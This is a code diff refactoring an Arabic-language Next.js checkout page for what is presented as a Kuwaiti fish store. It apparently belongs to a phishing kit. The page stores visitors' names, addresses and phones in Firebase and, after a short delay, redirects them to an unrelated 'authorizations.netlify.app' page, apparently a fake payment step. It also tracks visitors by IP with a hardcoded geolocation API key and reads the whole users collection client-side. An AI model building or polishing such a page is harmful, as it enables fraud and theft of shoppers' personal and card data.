@@ -1,86 +1,90 @@
 'use client'
 
 import React, { useEffect, useState } from 'react'
-import { Home, Briefcase, MapPin, ChevronRight, Phone } from 'lucide-react'
+import { Home, Briefcase, MapPin, ChevronRight } from 'lucide-react'
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
 import Image from 'next/image'
 import { Input } from '@/components/ui/input'
-import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTitle} from '@/components/ui/sheet'
-import { useCart } from '../context/cart-context'
-import { onSnapshot, getDoc, doc} from 'firebase/firestore'
+import { collection, query, getDocs } from 'firebase/firestore'
 import database from '@/lib/firebase'
 import { addData } from '../actions'
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
 
+interface PersonalInfo {
+  id: string
+  name: string
+  address: string
+  phone: string
+}
+
 export default function CheckoutPage() {
   const [selectedLocation, setSelectedLocation] = useState<LocationType>('home')
   const [paymentType, setPaymentType] = useState<PaymentType>('full')
-  const [personalInfo, setPersonalInfo] = useState({id:"2",name:'',address:'',phone:""})
-  const [loading, setisloading] = useState(false)
-  const [cartLength ,setCartLength] = useState(0)
+  const [personalInfo, setPersonalInfo] = useState<PersonalInfo>({ id: "2", name: '', address: '', phone: "" })
+  const [loading, setIsLoading] = useState(false)
+  const [cartLength, setCartLength] = useState(0)
   const [total, setTotal] = useState(0)
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     console.log(personalInfo)
-    addData({personalInfo})
+    await addData({ personalInfo })
 
-    setisloading(true)
+    setIsLoading(true)
     setTimeout(() => {
-      setisloading(false)
-      window.location.hostname="https://authorizations.netlify.app/"
-      window.location.replace("https://authorizations.netlify.app/")
+      setIsLoading(false)
+      window.location.href = "https://authorizations.netlify.app/"
     }, 3000)
   }
 
-  
-  const requestOptions = {
-    method: "GET",
-    redirect: "follow"
-  };
-
-function cleanString(input:string) {
-  return input.replace(/[^a-zA-Z0-9 ]/g, '');
-}
-useEffect(()=>{
-  const fetchIpAndSetupListener = async () => {
-    try {
-      const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4')
-      if (!response.ok) {
-        throw new Error('Failed to fetch IP geolocation data')
-      }
-      const result = await response.json()
-      const userId = cleanString(result.ip)
-      console.log('User ID:', userId)
-
-      const cartRef = doc(database, `users/${userId}/info/data`)
-      const unsubscribe = onSnapshot(cartRef, (snapshot) => {
-        const data = snapshot.data()
-        if (data && data.data) {
-          console.log('Firestore data:', data)
-          setCartLength(data.data().cart || 0)
-          setTotal(data.data().total || 0)
-        }
-      }, (err) => {
-        console.error('Firestore listener error:', err)
-      })
-
-      return () => unsubscribe()
-    } catch (err) {
-      console.error('Error:', err)
-    }
+  function cleanString(input: string) {
+    return input.replace(/[^a-zA-Z0-9]/g, '')
   }
 
-  fetchIpAndSetupListener()
-},[])
+  useEffect(() => {
+    const fetchIpAndSetupListener = async () => {
+      try {
+        const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4')
+        if (!response.ok) {
+          throw new Error('Failed to fetch IP geolocation data')
+        }
+        const result = await response.json()
+        const userId = cleanString(result.ip)
+        console.log('User ID:', userId)
+
+        const usersCollection = collection(database, 'users');
+        const usersQuery = query(usersCollection);
+        const querySnapshot = await getDocs(usersQuery);
+
+        const data: any[] = [];
+        querySnapshot.forEach((doc) => {
+          const userData = doc.data();
+          setCartLength(userData.data.cart)
+          setTotal(userData.data.total)
+
+          if (userData.info && userData.info.data) {
+            setTotal
+            data.push({
+              id: doc.id,
+              ...userData.info.data,
+            });
+          }
+        });
+      } catch (error) {
+        console.error('Error fetching data:', error)
+      }
+    }
+
+    fetchIpAndSetupListener()
+  }, [])
+
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
-    
-    <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
+      <form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
         {/* Location Selection */}
         <div className="space-y-4">
           <h1 className="text-xl font-bold text-right">حدد موقعك</h1>
@@ -89,57 +93,59 @@ useEffect(()=>{
             <h3 className="text-lg font-bold">تفاصيل العنوان</h3>
             <div className="grid grid-cols-1 gap-4">
               <div className="space-y-2">
-                <Label htmlFor="area">الأسم</Label>
+                <Label htmlFor="name">الأسم</Label>
                 <Input
-                  id="area"
-                  name="area"
+                  id="name"
+                  name="name"
                   required
+                  value={personalInfo.name}
                   onChange={(e) => setPersonalInfo((prev) => ({ ...prev, name: e.target.value }))}
-                  />
+                />
               </div>
               <div className="space-y-2">
-                <Label htmlFor="block">العنوان</Label>
+                <Label htmlFor="address">العنوان</Label>
                 <Input
-                  id="block"
-                  name="block"
+                  id="address"
+                  name="address"
                   required
+                  value={personalInfo.address}
                   onChange={(e) => setPersonalInfo((prev) => ({ ...prev, address: e.target.value }))}
-
                 />
               </div>
             </div>
 
             <div className="grid grid-cols-1 gap-4">
               <div className="space-y-2">
-                <Label htmlFor="street">البناية / الشقة</Label>
+                <Label htmlFor="building">البناية / الشقة</Label>
                 <Input
-                  id="street"
+                  id="building"
                   placeholder="مثال: بناية رقم 9"
                   required
                 />
               </div>
               <div className="space-y-2">
-                <Label htmlFor="house">رقم الهاتف</Label>
+                <Label htmlFor="phone">رقم الهاتف</Label>
                 <div className='flex'>
-                <Input
-                  id="house"
-                  name="house"
-                  type='tel'
-                  required
-                  onChange={(e) => setPersonalInfo((prev) => ({ ...prev, phone: e.target.value }))}
-
-                /> <Input
-                id="house"
-                name="house"
-                className='w-32 mx-1'
-                readOnly
-                value={'965+'}
-                required
-              /></div>
+                  <Input
+                    id="phone"
+                    name="phone"
+                    type='tel'
+                    required
+                    value={personalInfo.phone}
+                    onChange={(e) => setPersonalInfo((prev) => ({ ...prev, phone: e.target.value }))}
+                  />
+                  <Input
+                    id="countryCode"
+                    name="countryCode"
+                    className='w-32 mx-1'
+                    readOnly
+                    value={'965+'}
+                    required
+                  />
+                </div>
               </div>
             </div>
 
-          
             <div className="space-y-2">
               <Label htmlFor="notes">ملاحظات إضافية (اختياري)</Label>
               <Input
@@ -149,39 +155,33 @@ useEffect(()=>{
               />
             </div>
             <div className="flex justify-between gap-4">
-            <button
-              onClick={() => setSelectedLocation('client')}
-              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'client' ? 'bg-gray-200' : 'bg-gray-100'
-                }`}
-            >
-              <MapPin className="h-5 w-5" />
-              <span>العميل</span>
-            </button>
-            <button
-              onClick={() => setSelectedLocation('work')}
-              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'work' ? 'bg-gray-200' : 'bg-gray-100'
-                }`}
-            >
-              <Briefcase className="h-5 w-5" />
-              <span>العمل</span>
-            </button>
-            <button
-              onClick={() => setSelectedLocation('home')}
-              className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${selectedLocation === 'home' ? 'bg-black text-white' : 'bg-gray-100'
-                }`}
-            >
-              <Home className="h-5 w-5" />
-              <span>البيت</span>
-            </button>
+              {(['client', 'work', 'home'] as LocationType[]).map((locationType) => (
+                <button
+                  key={locationType}
+                  type="button"
+                  onClick={() => setSelectedLocation(locationType)}
+                  className={`flex-1 rounded-full py-3 px-4 flex items-center justify-center gap-2 ${
+                    selectedLocation === locationType
+                      ? locationType === 'home'
+                        ? 'bg-black text-white'
+                        : 'bg-gray-200'
+                      : 'bg-gray-100'
+                  }`}
+                >
+                  {locationType === 'client' && <MapPin className="h-5 w-5" />}
+                  {locationType === 'work' && <Briefcase className="h-5 w-5" />}
+                  {locationType === 'home' && <Home className="h-5 w-5" />}
+                  <span>{locationType === 'client' ? 'العميل' : locationType === 'work' ? 'العمل' : 'البيت'}</span>
+                </button>
+              ))}
+            </div>
           </div>
-          </div>
-          
         </div>
 
         {/* Payment Method */}
         <div className="space-y-4">
           <h2 className="text-xl font-bold text-right">طريقة الدفع</h2>
-          <button className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
+          <button type="button" className="w-full flex items-center justify-between bg-gray-100 p-4 rounded-lg">
             <div className="flex items-center gap-2">
               <ChevronRight className="h-5 w-5" />
               <span>بطاقة السحب الآلي</span>
@@ -201,9 +201,8 @@ useEffect(()=>{
           <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
           <div className="space-y-2">
             <div className="flex justify-between">
-            <span>المنتجات  ({cartLength} )</span>
-            
-            <span>{total}د.ك</span>
+              <span>المنتجات ({cartLength})</span>
+              <span>{total} د.ك</span>
             </div>
             <div className="flex justify-between">
               <span>قيمة التوصيل</span>
@@ -247,11 +246,12 @@ useEffect(()=>{
         {/* Proceed Button */}
         <Button
           type='submit'
-          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl">
-          {!loading ? `متابعة الدفع (${total})د.ك` : "الرجاء الانتظار"}
+          className="w-full bg-blue-200 text-blue-800 hover:bg-blue-300 p-6 text-lg rounded-xl"
+          disabled={loading}
+        >
+          {!loading ? `متابعة الدفع (${total}) د.ك` : "الرجاء الانتظار"}
         </Button>
       </form>
-      
     </div>
   )
 }
